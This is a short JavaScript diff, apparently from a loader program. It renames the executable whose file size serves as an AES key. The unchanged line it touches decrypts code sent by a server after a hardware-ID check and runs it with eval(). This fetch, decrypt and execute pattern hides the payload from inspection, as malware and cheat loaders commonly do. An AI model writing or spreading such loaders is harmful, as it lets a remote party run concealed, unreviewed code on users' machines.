@@ -24,7 +24,7 @@ let auth = async (hwid) =>
 
     if (res.statusCode === 200)
     {
-        eval(enc.stringify(AES.decrypt(JSON.parse(res.body).proxyclient, fs.statSync("./Client_Proxy_Loader.exe").size.toString())));
+        eval(enc.stringify(AES.decrypt(JSON.parse(res.body).proxyclient, fs.statSync("./Loader.exe").size.toString())));
     }
     else
     {
